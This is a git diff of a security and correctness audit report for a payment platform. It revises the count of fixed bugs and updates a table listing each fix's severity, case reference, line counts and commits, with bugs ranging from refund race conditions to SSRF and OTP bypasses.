@@ -6,16 +6,18 @@ Every bug was handled the same way: a failing test first, then the smallest fix 
 Each bug is one commit `fix(<ID>/<case refs>): …` on branch `audit/handover`; line counts below are computed from `git log --numstat 89daa69..audit/handover` (net per bug when a fix took more than one commit, see below).
 Production lines = code, SQL migrations and ops files; test files (`*.test.ts`, `*_test.go`) and docs are counted separately.
 
-**112 bugs fixed (+ 2 broken tests repaired) · 1085 production lines changed · every fix proven by a failing-then-passing test**
+**93 bugs in the handed-over code fixed · 1025 production lines changed · every fix proven by a failing-then-passing test**
 
-- 117 `fix(...)` commits for those 112 bugs (follow-up commits CW-1b and PL-1b are counted under CW-1 and PL-1). Median production lines per bug: **7**. Bugs fixed in ≤ 6 production lines: **52 of 112**.
-- A bug fixed in more than one commit is counted by its **net** production change: `git diff <first>^ <last>` over that bug's production files, used only when no other commit touched those files in between. PL-1 +10/−5 net (per-commit sum +43/−38: `104c871` + `f487401`); CW-1 +9/−1 net (per-commit sum +17/−9: `14db87c` + `ec100ed`); AUTH-13 +8/−0 net (per-commit sum +10/−2: `97e6a46` + `bcdfff3`). TEAM_REPORT's change log keeps the per-commit history.
-- By severity: Critical 9, High 50, Medium 33, Low 20.
+Counted separately and listed below, never in that headline: 4 hardening items, 2 capacity changes, 7 UI/UX improvements, 2 FP-300 build items, 11 findings reported but not changed (including fixes we reverted after an independent false-positive review), and 2 baseline test repairs. Our own follow-up fixes are folded into the bug they followed up (e.g. PL-1b/PL-1c under PL-1).
+
+- 107 `fix(...)` commits for those 93 bugs (our follow-up commits are counted under the bug they follow up). Median production lines per bug: **7**. Bugs fixed in ≤ 6 production lines: **44 of 93**.
+- A bug fixed in more than one commit is counted by its **net** production change: `git diff <first>^ <last>` over that bug's production files, used only when no other commit touched those files in between. CW-7 +11/−9 net (per-commit sum +16/−14: `1cca258` + `a3b87cb` + `a9abf28`); CW-1 +9/−1 net (per-commit sum +17/−9: `14db87c` + `ec100ed`); AUTH-13 +8/−0 net (per-commit sum +10/−2: `97e6a46` + `bcdfff3`); PL-6 +3/−7 net (per-commit sum +14/−18: `5759285` + `ec0b02d`). TEAM_REPORT's change log keeps the per-commit history.
+- By severity: Critical 9, High 36, Medium 35, Low 13.
 - Proof exceptions: MIG-1 (migrations) and B8 (a committed secret) have no unit test; they are proven by a reproducible runtime check in their notes (fresh `migrate` applies every file; `git ls-files ops` / `git grep` finds no secret value).
 - REC-1's commit `b4e6b95` also carries the FP-300 reconciliation lines (refunds on their own lines), so its +29/−28 is included in the per-bug total.
 - Test suites on a fresh database (79 migrations): **TS 550/550** (api 463, reporting 17, web 14, admin 3, money 40, events 4, scripts 9) and **Go 7/7 packages**. Baseline before the audit: TS 414/430.
 
-- **Net production footprint vs. the handed-over main (`8b58b0f`):** 129 files, **+1342/−502 = 1844 lines** (superseded attempts such as PL-1's first version drop out). This includes the FP-300 feature code and the ops/compose infrastructure; the per-bug total above counts bug fixes only.
+- **Net production footprint vs. the handed-over main (`8b58b0f`):** 135 files, **+1657/−497 = 2154 lines** (superseded attempts such as PL-1's first version drop out). This includes the FP-300 feature code and the ops/compose infrastructure; the per-bug total above counts bug fixes only.
 
 ### Judge's quick tour: the 10 most severe bugs
 
@@ -25,9 +27,9 @@ Production lines = code, SQL migrations and ops files; test files (`*.test.ts`, 
 4. [**REF-3**](#f-ref-3) · H1 · Critical · Refund ceiling uses the authorized amount, not the captured amount · prod +1/−1
 5. [**REF-2**](#f-ref-2) · FP-300 · Critical · Any merchant can refund another merchant's transaction · prod +2/−2
 6. [**ADMIN-IMP-1**](#f-admin-imp-1) · H3 · Critical · Admin impersonation grants can write as the merchant (super_admin becomes owner) · prod +4/−2
-7. [**REF-1**](#f-ref-1) · FP-209 · Critical · Concurrent refunds both pay out (unlocked check, acquirer outside the txn, absolute write) · prod +10/−8
+7. [**REF-1**](#f-ref-1) · FP-209 · Critical · Concurrent refunds both pay out (unlocked check, acquirer outside the txn, absolute write) · prod +15/−13
 8. [**ADMIN-CRED-1**](#f-admin-cred-1) · H3 · Critical · Credit creation has no role gate: a support admin can post credits · prod +2/−1
-9. [**PL-1**](#f-pl-1) · INCIDENT 2026-05-14 · Critical · A slow payment lets a second buyer re-claim the link and both are charged · prod +10/−5 (net of 2 commits; first version superseded)
+9. [**PL-1**](#f-pl-1) · INCIDENT 2026-05-14 · Critical · A slow payment lets a second buyer re-claim the link and both are charged · prod +54/−40
 10. [**MIG-1**](#f-mig-1) · FP-300 (☐1, ☐6), F4 · High · A fresh database cannot be built: migrations 0054/0055 abort · prod +7/−9
 
 **Infrastructure (not counted as bugs):**
@@ -42,6 +44,7 @@ Production lines = code, SQL migrations and ops files; test files (`*.test.ts`, 
 | `fe69eff` | chore(ops): demo never disables the ledger trigger; deterministic acquirer for demos; LED-1 runtime evidence | +6/−6 |
 | `dfbebd7` | chore(ops): seed passwords overridable for hosted deploy | +8/−2 |
 | `db2d8f9` | chore(CAP-4): renumber the hot-path index migration 0100 -> 0101 | +0/−0 |
+| `a8e8d3c` | chore(C5): renumber the admin audit append-only migration 0101 -> 0102 | +0/−0 |
 
 `4c6816e` is labelled `fix(AUTH-6,OPS-1)` but is the compose/Dockerfile work that makes the stack run; it is listed here, not in the bug totals.
 
@@ -57,154 +60,179 @@ Production lines = code, SQL migrations and ops files; test files (`*.test.ts`, 
 | 4 | REF-3 | Refund ceiling uses the authorized amount, not the captured amount | H1 | Critical | +1/−1 | +21/−3 | `bf476ed` |
 | 5 | REF-2 | Any merchant can refund another merchant's transaction | FP-300 | Critical | +2/−2 | +20/−2 | `0283a8e` |
 | 6 | ADMIN-IMP-1 | Admin impersonation grants can write as the merchant (super_admin becomes owner) | H3 | Critical | +4/−2 | +61/−0 | `8d10830` |
-| 7 | REF-1 | Concurrent refunds both pay out (unlocked check, acquirer outside the txn, absolute write) | FP-209 | Critical | +10/−8 | +43/−1 | `799ff25` |
+| 7 | REF-1 | Concurrent refunds both pay out (unlocked check, acquirer outside the txn, absolute write) | FP-209 | Critical | +15/−13 | +78/−1 | `799ff25` (REF-1), `d8ddb9f` (REF-1b) |
 | 8 | ADMIN-CRED-1 | Credit creation has no role gate: a support admin can post credits | H3 | Critical | +2/−1 | +17/−0 | `eed6c09` |
-| 9 | PL-1 | A slow payment lets a second buyer re-claim the link and both are charged | INCIDENT 2026-05-14 | Critical | +10/−5 (net of 2 commits; first version superseded) | +62/−0 | `104c871` (PL-1), `f487401` (PL-1b) |
+| 9 | PL-1 | A slow payment lets a second buyer re-claim the link and both are charged | INCIDENT 2026-05-14 | Critical | +54/−40 | +145/−0 | `104c871` (PL-1), `f487401` (PL-1b), `4d2527c` (CAP-6) |
 | 10 | MIG-1 | A fresh database cannot be built: migrations 0054/0055 abort | FP-300 (☐1, ☐6), F4 | High | +7/−9 | +0/−0 | `197c3e2` |
-| 11 | B8 | A live acquirer signing secret is committed in a tracked env file | FP-240, H3 | High | +5/−6 | +0/−0 | `d95d570` |
-| 12 | NET-1 | Net payout computed through float32 BD | FP-300 ☐3 | High | +2/−4 | +25/−1 | `27187a2` |
-| 13 | CW-3 | Outbound webhook signature does not cover the bytes actually sent | FP-240, FP-300 ☐4 | High | +4/−2 | +9/−2 | `96d0f80` |
-| 14 | REF-4 | A refund without a reason violates chk_refunds_reason_not_null after the acquirer has paid | FP-300 (☐1 "works from start to end") | High | +1/−1 | +4/−2 | `013f6da` |
-| 15 | SCHEME-1 | Scheme amount is the untruncated gross rounded half-up by NUMERIC(10,2) | F1, ADR-0002 | High | +2/−2 | +49/−1 | `d1e6cbb` |
-| 16 | ADMIN-TEST-1 | "Recompute statuses" silently takes sandbox merchants live | G3, H7 | High | +1/−2 | +71/−0 | `cb1d51a` |
-| 17 | SCHEME-2 | ADR-0002 truncation residue is never journaled at close | F1, F2, ADR-0002 | High | +7/−0 | +37/−0 | `ffdf52b` |
-| 18 | CW-2 | Acquirer callbacks accepted without a signature by default | FP-240 | High | +2/−11 | +9/−12 | `85f6d2f` |
-| 19 | REF-5 | Status recompute turns chargebacks back into refundable captures | H7, H1, FP-300 | High | +1/−1 | +24/−0 | `7f51175` |
-| 20 | BAL-1 | Admin "rebuild cached balances" rebuilds from scheme export lines, not the ledger | F4, FP-203 | High | +3/−3 | +5/−5 | `aae0aed` |
-| 21 | F2-SWEEP | The March residue sweep doubles the gap every time it is re-run | F2 | High | +4/−2 | +32/−0 | `8f1550d` |
-| 22 | MDR-1 | MDR recalculation re-prices PAID batches in place | F5 | High | +2/−2 | +39/−0 | `3df94da` |
-| 23 | CW-5 | Acquirer callbacks are never deduplicated | FP-201 | High | +12/−1 | +14/−0 | `b43c940` |
-| 24 | CLOSE-1 | run-batch closes and pays a business day that has not ended | H5 | High | +4/−1 | +25/−0 | `56cdd1f` |
-| 25 | HOLD-1 | Nightly hold janitor deletes every hold on a night with nothing expired | (no case ref; data integrity) | High | +4/−5 | +52/−2 | `97226a1` |
-| 26 | REF-6 | Acquirer refund idempotency key changes on every retry | FP-300 (☐2 "money is right in the ledger") | High | +1/−1 | +24/−0 | `9b6da21` |
-| 27 | CW-1 | A payout disbursement record is written per webhook delivery, not per batch | INC-2026-08-21 | High | +9/−1 (net of 2 commits; first version superseded) | +50/−0 | `14db87c` (CW-1), `ec100ed` (CW-1b) |
-| 28 | ADMIN-CRED-2 | Credit maker-checker compares display names instead of admin user ids | H3 | High | +1/−1 | +21/−1 | `dde9aab` |
-| 29 | PL-3 | Payment-link cancel is a cross-merchant IDOR | G5 | High | +9/−8 | +16/−0 | `8279360` |
-| 30 | AUTH-4 | OTP codes and payment-link tokens come from Math.random | H8 | High | +4/−2 | +19/−0 | `d42c5eb` |
-| 31 | PL-2 | Public pay route checks expiry against the client-supplied submittedAt | FP-187 | High | +5/−9 | +21/−5 | `0d292af` |
-| 32 | AUTH-5 | OTP attempt limit is check-then-act: parallel guesses bypass max_attempts | H8 | High | +6/−12 | +68/−0 | `2a52b5f` |
-| 33 | OBX-POISON | A missing rollup row makes the parity check throw and wedges the reporting consumer | FP-300 ☐5 | High | +2/−1 | +36/−0 | `08b0e59` |
-| 34 | SPLIT-1 | Split children are rounded separately, so the remainder is lost (or invented) | F3, H2 | High | +21/−1 | +66/−0 | `2b6d181` |
-| 35 | AUTH-3 | Admin API-key rotation never revokes the old key | H4 | High | +2/−0 | +6/−7 | `cfcd6f6` |
-| 36 | NOTIFY-1 | settlement.paid enqueue is check-then-insert with no unique key, so concurrent runs double-notify | INC-2026-08-21 | High | +19/−4 | +48/−0 | `664f548` |
-| 37 | OBX-DOUBLE | Unlocked cursor read lets concurrent reporting passes double-apply events | FP-300 ☐5 | High | +4/−3 | +34/−0 | `a63a29e` |
-| 38 | SUM-1 | Settlement summary sums the running captured total once per capture event | H6, FP-300 ☐5 | High | +1/−1 | +43/−0 | `cf8075a` |
-| 39 | IDEM-1 | Capture idempotency hash omits the transaction id, so a reused key on another transaction replays a fake success | FP-300 (☐2 "money is right in the ledger") | High | +1/−1 | +16/−2 | `696a028` |
-| 40 | EXP-1 | CSV export buffers a merchant's whole history in memory in a 512 MB container | H9 | High | +8/−2 | +13/−0 | `c05f50d` |
-| 41 | REF-7 | A refund reverses the gross MDR fee, ignoring the negotiated-discount rebate | H1 | High | +2/−2 | +107/−0 | `31b3db3` |
-| 42 | REF-1b | A refund racing a declined refund can lock the transaction as `refunded` for good | FP-209 / H1 | High | +5/−5 | +35/−0 | `d8ddb9f` |
-| 43 | REC-1 | Reconciliation can never tie out: payout legs counted inside the window, pending fees are float re-estimates, refunds missing | H1 / FP-300 | High | +29/−28 | +130/−0 | `b4e6b95` |
-| 44 | VOL-1 | Platform volume counter is INT4 / int32 and wraps past the fee-tier threshold | none (money rule: integer fils in BIGINT/int64, case file + ADR-0001) | High | +9/−6 | +78/−0 | `43e737e` |
-| 45 | AUTHZ-1 | A merchant 'support' user can capture and void transactions (no role gate) | H3 | High | +5/−7 | +84/−0 | `b6c0f4a` |
-| 46 | RPT-SCOPE-1 | Any merchant can read any split child's transactions through the report filter |  | High | +5/−5 | +31/−0 | `4743bb1` |
-| 47 | IMP-2 | CSV adjustment import is not idempotent: the same file posts twice | F7 (adjustment import), 2026-09-04 double upload | High | +10/−4 | +38/−0 | `f3d59e7` |
-| 48 | ADJ-1 | "Adjust balance" writes the merchant_balances cache only, with no ledger entry | F4 / FP-203 (balance must come from the ledger) | High | +2/−2 | +22/−0 | `4517985` |
-| 49 | ADMIN-KYC-1 | Bulk KYC approve ignores the current status and writes no review rows |  | High | +7/−1 | +48/−0 | `abd6c81` |
-| 50 | CW-4 | Merchant webhook URLs can target internal hosts, and delivery follows redirects (SSRF) | none (security; webhook delivery runs inside the platform network) | High | +4/−1 | +68/−0 | `6d08e08` |
-| 51 | FEES-3 | Payment-link captures never get the negotiated discount; the webhook and timeline report the pre-discount fee | FP-300 ☐3 | High | +13/−14 | +147/−0 | `220cb20` |
-| 52 | AUTH-12 | A suspended or closed merchant keeps transacting through live sessions, API keys and payment links |  | High | +5/−4 | +39/−0 | `f0f932a` |
-| 53 | AUTH-13 | The OTP attempt cap is defeated by logging in again: every login mints a fresh 5-guess challenge, without limit | H8 | High | +8/−0 (net of 2 commits; first version superseded) | +78/−0 | `97e6a46` (AUTH-13), `bcdfff3` (AUTH-13) |
-| 54 | UI-NEG-1 | The merchant dashboard crashes on any negative amount, so opening a refunded transaction or a negative reconciliation gap kills the whole app | FP-300 | High | +1/−1 | +5/−0 | `158f140` |
-| 55 | OBX-SKIP | Reporting outbox watermark follows id order, not commit order: late-committing events are skipped forever | FP-300 ☐5 | High | +9/−3 | +35/−0 | `d66de70` |
-| 56 | ADMIN-IDEM-1 | A double-submitted admin credit or balance adjustment posts to the ledger twice |  | High | +29/−7 | +51/−0 | `c8e00cc` |
-| 57 | CAP-2 | Under overload the API queues every request until it times out instead of turning the excess away |  | High | +11/−0 | +58/−0 | `fe36e11` |
-| 58 | CAP-4 | Every capture scans the whole ledger four times and the whole holds table once, so checkout capacity falls as the ledger grows |  | High | +4/−0 | +33/−0 | `ebc46d2` |
-| 59 | CAP-6 | A crash between the capture commit and "link paid" leaves captured money on a link that can be paid again | INCIDENT 2026-05-14 | High | +11/−2 | +83/−0 | `4d2527c` |
-| 60 | CW-8 | The API cannot boot in development: the built-in webhook key is 34 bytes | FP-300 (☐6), G4 | Medium | +1/−1 | +10/−0 | `bf810ef` |
-| 61 | CW-9 | refund.succeeded is enqueued but never delivered as a webhook | FP-300 ☐4 | Medium | +19/−2 | +27/−0 | `152e27e` |
-| 62 | CW-7 | Inbound acquirer HMAC is computed over re-serialized JSON, with no freshness check | FP-240, FP-201 | Medium | +14/−11 | +46/−11 | `1cca258` |
-| 63 | SCHED-1 | Daemon takes "today" from the UTC date, so the Bahrain close runs at 03:00 + delay | G1, H5 | Medium | +6/−4 | +22/−0 | `649e4dd` |
-| 64 | EST-1 | Lifetime payout total is a REAL accumulated through float32 | G2 | Medium | +6/−1 | +35/−1 | `d88497a` |
-| 65 | SUM-2 | No index serves batched capture events by time, so the settlement summary scans transaction_events | H6 | Medium | +7/−0 | +24/−0 | `c55c71e` |
-| 66 | FEES-4 | Dashboard fee shows the most recently entered schedule, not the one in force | F6 | Medium | +5/−13 | +6/−5 | `5a329f6` |
-| 67 | REF-8 | Partial refunds round the fee reversal per partial, so they can reverse more fee than was charged | H1 | Medium | +5/−4 | +25/−0 | `01e6cd7` |
-| 68 | REF-6b | Acquirer simulator caches transport errors, so a same-key refund retry can never succeed | FP-209, FP-300 (☐1) | Medium | +1/−1 | +22/−0 | `de6d70a` |
-| 69 | AUTH-7 | OTP resend resets the guess budget | H8 | Medium | +3/−2 | +25/−0 | `730526d` |
-| 70 | CW-6 | Webhook replays mint a new Webhook-Delivery-Id, so receivers cannot dedupe them | INC-2026-08-21 | Medium | +12/−20 | +12/−7 | `cffcb17` (CW-6), `cbbeb38` (CW-6b) |
-| 71 | ADMIN-IMP-2 | Impersonation grants survive admin disable and logout | H3 | Medium | +9/−3 | +31/−0 | `88a5616` |
-| 72 | LED-1 | The ledger can be edited and deleted as long as each group still balances | F2 | Medium | +13/−0 | +43/−0 | `3c35a5e` |
-| 73 | FEES-5 | Settlement re-prices each capture with its own formula, so the batch fee drifts from the ledger and strands fils in merchant_payable | FP-300 ☐3 | Medium | +11/−22 | +248/−16 | `5542c53` |
-| 74 | PL-6 | Public payment-link read leaks the merchant's live API key prefix and SHA-256 hash |  | Medium | +1/−16 | +6/−2 | `5759285` |
-| 75 | IDEM-2 | Authorize idempotency fingerprint is an unkeyed SHA-256 over the full PAN and CVV, stored at rest |  | Medium | +2/−1 | +34/−0 | `b31f3a6` |
-| 76 | CFG-1 | Any unknown NODE_ENV (for example "prod") silently boots as development: OTP codes in responses, non-Secure cookies, production checks skipped | H8 | Medium | +1/−0 | +7/−0 | `b421c00` |
-| 77 | IMP-3 | CSV import splits a thousands-separated amount and posts its first digit group | F7 | Medium | +3/−0 | +12/−1 | `f181469` |
-| 78 | CRED-1 | Manual credit ledger legs are dated to the operator-typed effective date (back- or future-dated, unbounded) | (also lead ADMIN-CRED-3) | Medium | +10/−10 | +33/−23 | `9411f13` (CRED-1), `85dd5fc` (CRED-1) |
-| 79 | PL-5 | A failed capture in the payment-link checkout strands an authorized transaction and its 7-day hold | FP-300 ☐1 | Medium | +4/−1 | +23/−0 | `77a4ebb` |
-| 80 | CAP-EXP-1 | An authorization whose 7-day hold has expired can still be captured |  | Medium | +7/−0 | +31/−0 | `daeba5f` |
-| 81 | BAL-2 | Balance rebuild counts unbatched captures and refunds that the close then adds again | F4 | Medium | +9/−3 | +82/−0 | `f4b53a8` |
-| 82 | ADMIN-CRED-4 | A credit's MDR reversal uses the display rate (merchants.mdr_bps), not the rate capture charged | F6 | Medium | +2/−1 | +15/−0 | `0dc835a` |
-| 83 | RBD-1 | Admin "Rebuild analytics" double-applies the reporting backlog and wipes the FP-300 refund columns | FP-300 ☐5 | Medium | +14/−1 | +81/−0 | `01b75b1` |
-| 84 | UI-DATE-1 | Merchant dashboard date filters use the UTC day, so each day loses its first 3 Bahrain hours | G1 | Medium | +2/−2 | +5/−2 | `a90e26c` |
-| 85 | UI-SETTLE-1 | Admin "Run batch" form defaults to the wrong business date between 00:00 and 03:00 Bahrain | G1 | Medium | +5/−5 | +22/−0 | `3d47d7a` |
-| 86 | ADMIN-IMP-3 | "View as merchant" never opens the dashboard: /v1/auth/me ignores the impersonation grant | H3 | Medium | +11/−3 | +38/−0 | `f71695a` |
-| 87 | CHECKOUT-375 | On a phone the checkout's CVV field is off-screen and dashboard pages overflow sideways |  | Medium | +13/−0 | +0/−0 | `993c95a` |
-| 88 | RECON-REFUNDS | Merchant reconciliation says "no gap" over three numbers that do not add up (refund lines not shown) | H1 / FP-300 | Medium | +8/−2 | +0/−0 | `0208c59` |
-| 89 | CW-10 | Webhook transport buffers the whole receiver response with no byte cap |  | Medium | +11/−3 | +42/−0 | `c68fbdd` |
-| 90 | ARC-1 | Webhook delivery archive loads an unbounded date range into one in-memory JSON string | H9 | Medium | +7/−4 | +20/−1 | `51ec9bb` |
-| 91 | ADMIN-UPL-1 | KYC upload buffers any number of files and decodes images of any pixel count | H9 | Medium | +9/−3 | +59/−1 | `b809526` |
-| 92 | U4 | Batch views show Gross − Fee ≠ Net payout with nothing explaining the netted refunds | FP-300 | Medium | +10/−4 | +10/−1 | `d3953ff` |
-| 93 | TEST-BACKOFF | Dispatcher backoff test asserts an exact value from a jittered function | baseline test failure | Low | +0/−0 | +2/−2 | `3cb19b7` |
-| 94 | TEST-OUTBOX-FIXTURE | Webhook archive test seeds malformed rollup events that break the reporting consumer tests | baseline test failure (FP-300 ☐5) | Low | +0/−0 | +4/−2 | `139f5aa` |
-| 95 | F2-WINDOW | The March residue sweep reads a UTC month, not the Bahrain month | F2, G1/H5 (timezone) | Low | +1/−1 | +3/−2 | `13831ee` |
-| 96 | AUTH-1·rpt | Reporting export-summary has no authentication gate | H3 | Low | +1/−1 | +28/−0 | `622a94f` |
-| 97 | AUTH-9 | OTP verify never re-issues the merchant cookie, so fp_sid keeps the 10-minute pending Max-Age |  | Low | +2/−0 | +14/−0 | `06ae227` |
-| 98 | ADMIN-KYC-2 | The PDF-only KYC rule checks the filename, so a renamed JPEG is accepted as a commercial registration | H3 | Low | +2/−1 | +21/−0 | `92d920a` |
-| 99 | CW-11 | Acquirer callback `outcome` and `occurredAt` are never validated, so any string is stored as a fraud verdict |  | Low | +5/−1 | +21/−0 | `0ec33d1` |
-| 100 | CW-12 | Merchants cannot stop deliveries: deleting an endpoint with history returns 500, and a disabled endpoint keeps getting retries |  | Low | +7/−3 | +35/−0 | `03aa660` |
-| 101 | ERR-1 | A NUL byte in any request string turns into a 500 internal_error instead of a 400 |  | Low | +6/−0 | +11/−0 | `59d1770` |
-| 102 | TXN-1 | withTransaction lets a failing ROLLBACK mask the real error and returns the broken client to the pool |  | Low | +3/−2 | +30/−0 | `5c032db` |
-| 103 | SEC-1 | Every merchant `:id` route answers 500 for a malformed id (Postgres 22P02) instead of 404 |  | Low | +6/−0 | +23/−0 | `a996cd2` |
-| 104 | CLI-1 | `settlement rebuild-balances --merchant=<id>` prints the rebuilt figure but never writes it | F4 | Low | +15/−3 | +23/−0 | `e9778fc` |
-| 105 | IMP-4 | CSV adjustment import answers an unknown merchant or a NUL byte with a 500 | F7 | Low | +7/−1 | +15/−0 | `b3cad51` |
-| 106 | DATE-1 | Report date windows include the exclusive "to" day, and bare report dates are UTC, not Bahrain days |  | Low | +3/−3 | +22/−0 | `c6d63f6` |
-| 107 | UI-SETTLE-1b | Settlement's 400 (bad operator input) is turned into a 500 server error in the admin console |  | Low | +4/−2 | +19/−1 | `067103b` |
-| 108 | ADMIN-IMP-3b | "View as merchant" opens the web app's root, which is a 404 | H3 | Low | +2/−0 | +28/−0 | `57c82d0` |
-| 109 | ROUTER-404 | A mistyped URL or a page that throws shows React Router's developer error screen in both apps |  | Low | +13/−2 | +54/−0 | `53442f5` |
-| 110 | LINK-EXPIRED | The merchant dashboard shows an expired payment link as "active" and still offers Cancel | FP-187 | Low | +11/−5 | +11/−1 | `81514a5` |
-| 111 | UI-401 | An ended session shows a raw "unauthenticated" over stale data instead of the login page |  | Low | +4/−0 | +60/−0 | `a9bb039` |
-| 112 | CHECKOUT-PAIDAT | Checkout's "Payment successful" page shows a raw UTC ISO timestamp | G1 | Low | +1/−1 | +0/−0 | `84214f6` |
-| 113 | BATCH-BAR | Merchant batch page shows a meaningless "progress bar" computed from fils in floating point | ADR-0001 | Low | +0/−6 | +0/−0 | `fa0e21d` |
-| 114 | IMP-BANNER | Admin impersonation banner still describes write access the grant no longer has | H3 | Low | +1/−1 | +0/−0 | `deda775` |
+| 11 | NET-1 | Net payout computed through float32 BD | FP-300 ☐3 | High | +2/−4 | +25/−1 | `27187a2` |
+| 12 | CW-3 | Outbound webhook signature does not cover the bytes actually sent | FP-240, FP-300 ☐4 | High | +4/−2 | +9/−2 | `96d0f80` |
+| 13 | REF-4 | A refund without a reason violates chk_refunds_reason_not_null after the acquirer has paid | FP-300 (☐1 "works from start to end") | High | +1/−1 | +4/−2 | `013f6da` |
+| 14 | SCHEME-1 | Scheme amount is the untruncated gross rounded half-up by NUMERIC(10,2) | F1, ADR-0002 | High | +2/−2 | +49/−1 | `d1e6cbb` |
+| 15 | ADMIN-TEST-1 | "Recompute statuses" silently takes sandbox merchants live | G3, H7 | High | +1/−2 | +71/−0 | `cb1d51a` |
+| 16 | SCHEME-2 | ADR-0002 truncation residue is never journaled at close | F1, F2, ADR-0002 | High | +7/−0 | +37/−0 | `ffdf52b` |
+| 17 | BAL-1 | Admin "rebuild cached balances" rebuilds from scheme export lines, not the ledger | F4, FP-203 | High | +3/−3 | +5/−5 | `aae0aed` |
+| 18 | F2-SWEEP | The March residue sweep doubles the gap every time it is re-run | F2 | High | +4/−2 | +32/−0 | `8f1550d` |
+| 19 | MDR-1 | MDR recalculation re-prices PAID batches in place | F5 | High | +2/−2 | +39/−0 | `3df94da` |
+| 20 | HOLD-1 | Nightly hold janitor deletes every hold on a night with nothing expired | (no case ref; data integrity) | High | +4/−5 | +52/−2 | `97226a1` |
+| 21 | REF-6 | Acquirer refund idempotency key changes on every retry | FP-300 (☐2 "money is right in the ledger") | High | +2/−2 | +46/−0 | `9b6da21` (REF-6), `de6d70a` (REF-6b) |
+| 22 | ADMIN-CRED-2 | Credit maker-checker compares display names instead of admin user ids | H3 | High | +1/−1 | +21/−1 | `dde9aab` |
+| 23 | PL-3 | Payment-link cancel is a cross-merchant IDOR | G5 | High | +9/−8 | +16/−0 | `8279360` |
+| 24 | AUTH-4 | OTP codes and payment-link tokens come from Math.random | H8 | High | +4/−2 | +19/−0 | `d42c5eb` |
+| 25 | PL-2 | Public pay route checks expiry against the client-supplied submittedAt | FP-187 | High | +5/−9 | +21/−5 | `0d292af` |
+| 26 | AUTH-5 | OTP attempt limit is check-then-act: parallel guesses bypass max_attempts | H8 | High | +6/−12 | +68/−0 | `2a52b5f` |
+| 27 | OBX-POISON | A missing rollup row makes the parity check throw and wedges the reporting consumer | FP-300 ☐5 | High | +2/−1 | +36/−0 | `08b0e59` |
+| 28 | AUTH-3 | Admin API-key rotation never revokes the old key | H4 | High | +2/−0 | +6/−7 | `cfcd6f6` |
+| 29 | NOTIFY-1 | settlement.paid enqueue is check-then-insert with no unique key, so concurrent runs double-notify | INC-2026-08-21 | High | +19/−4 | +48/−0 | `664f548` |
+| 30 | OBX-DOUBLE | Unlocked cursor read lets concurrent reporting passes double-apply events | FP-300 ☐5 | High | +4/−3 | +34/−0 | `a63a29e` |
+| 31 | SUM-1 | Settlement summary sums the running captured total once per capture event | H6, FP-300 ☐5 | High | +1/−1 | +43/−0 | `cf8075a` |
+| 32 | IDEM-1 | Capture idempotency hash omits the transaction id, so a reused key on another transaction replays a fake success | FP-300 (☐2 "money is right in the ledger") | High | +1/−1 | +16/−2 | `696a028` |
+| 33 | EXP-1 | CSV export buffers a merchant's whole history in memory in a 512 MB container (mitigated: 400 above 50,000 rows; streaming deferred) | H9 | High | +8/−2 | +13/−0 | `c05f50d` |
+| 34 | REF-7 | A refund reverses the gross MDR fee, ignoring the negotiated-discount rebate | H1 | High | +2/−2 | +107/−0 | `31b3db3` |
+| 35 | REC-1 | Reconciliation can never tie out: payout legs counted inside the window, and pending fees are float re-estimates | FP-300 ☐5 | High | +37/−30 | +130/−0 | `b4e6b95` (REC-1), `0208c59` (RECON-REFUNDS) |
+| 36 | AUTHZ-1 | A merchant 'support' user can capture and void transactions (no role gate) | H3 | High | +5/−7 | +84/−0 | `b6c0f4a` |
+| 37 | RPT-SCOPE-1 | Any merchant can read any split child's transactions through the report filter |  | High | +5/−5 | +31/−0 | `4743bb1` |
+| 38 | IMP-2 | CSV adjustment import is not idempotent: the same file posts twice | F7 (adjustment import), 2026-09-04 double upload | High | +10/−4 | +38/−0 | `f3d59e7` |
+| 39 | ADJ-1 | "Adjust balance" writes the merchant_balances cache only, with no ledger entry | F4 / FP-203 (balance must come from the ledger) | High | +2/−2 | +22/−0 | `4517985` |
+| 40 | ADMIN-KYC-1 | Bulk KYC approve ignores the current status and writes no review rows |  | High | +7/−1 | +48/−0 | `abd6c81` |
+| 41 | CW-4 | Merchant webhook URLs can target internal hosts, and delivery follows redirects (SSRF) | none (security; webhook delivery runs inside the platform network) | High | +4/−1 | +68/−0 | `6d08e08` |
+| 42 | FEES-3 | Payment-link captures never get the negotiated discount; the webhook and timeline report the pre-discount fee | FP-300 ☐3 | High | +13/−14 | +147/−0 | `220cb20` |
+| 43 | UI-NEG-1 | The merchant dashboard crashes on any negative amount, so opening a refunded transaction or a negative reconciliation gap kills the whole app | FP-300 | High | +1/−1 | +5/−0 | `158f140` |
+| 44 | OBX-SKIP | Reporting outbox watermark follows id order, not commit order: late-committing events are skipped forever | FP-300 ☐5 | High | +9/−3 | +35/−0 | `d66de70` |
+| 45 | ADMIN-IDEM-1 | A double-submitted admin credit posts to the ledger twice |  | High | +29/−7 | +51/−0 | `c8e00cc` |
+| 46 | CW-8 | The API cannot boot in development: the built-in webhook key is 34 bytes | FP-300 (☐6), G4 | Medium | +1/−1 | +10/−0 | `bf810ef` |
+| 47 | B8 | Committed sandbox signing secret for informational callbacks | FP-240 | Medium | +5/−6 | +0/−0 | `d95d570` |
+| 48 | CW-2 | Acquirer callbacks accepted without a signature by default | FP-240 | Medium | +2/−11 | +9/−12 | `85f6d2f` |
+| 49 | REF-5 | Status recompute turns chargebacks, if chargeback rows exist, back into refundable captures | H1, FP-300 | Medium | +1/−1 | +24/−0 | `7f51175` |
+| 50 | CW-7 | Inbound acquirer HMAC is computed over re-serialized JSON, with an early-exit compare | FP-240 | Medium | +11/−9 (net of fix and partial revert) | +50/−28 | `1cca258` (CW-7), `a3b87cb` (CW-7), `a9abf28` (CW-7) |
+| 51 | CW-5 | Acquirer callbacks are never deduplicated | FP-201 | Medium | +12/−1 | +14/−0 | `b43c940` |
+| 52 | CLOSE-1 | run-batch accepts a business day that has not ended, and a closed day is never revisited, so that day's later captures would never be paid |  | Medium | +4/−1 | +25/−0 | `56cdd1f` |
+| 53 | CW-1 | A payout disbursement record is written per webhook delivery, not per batch |  | Medium | +9/−1 (net of 2 commits; first version superseded) | +50/−0 | `14db87c` (CW-1), `ec100ed` (CW-1b) |
+| 54 | SCHED-1 | Daemon takes "today" from the UTC date, so the Bahrain close runs at 03:00 + delay | G1, H5 | Medium | +6/−4 | +22/−0 | `649e4dd` |
+| 55 | SPLIT-1 | Split children are rounded separately, so up to 1 fil per batch is lost or invented (a contributing cause of F3/H2, not its tens of fils) | F3, H2 | Medium | +21/−1 | +66/−0 | `2b6d181` |
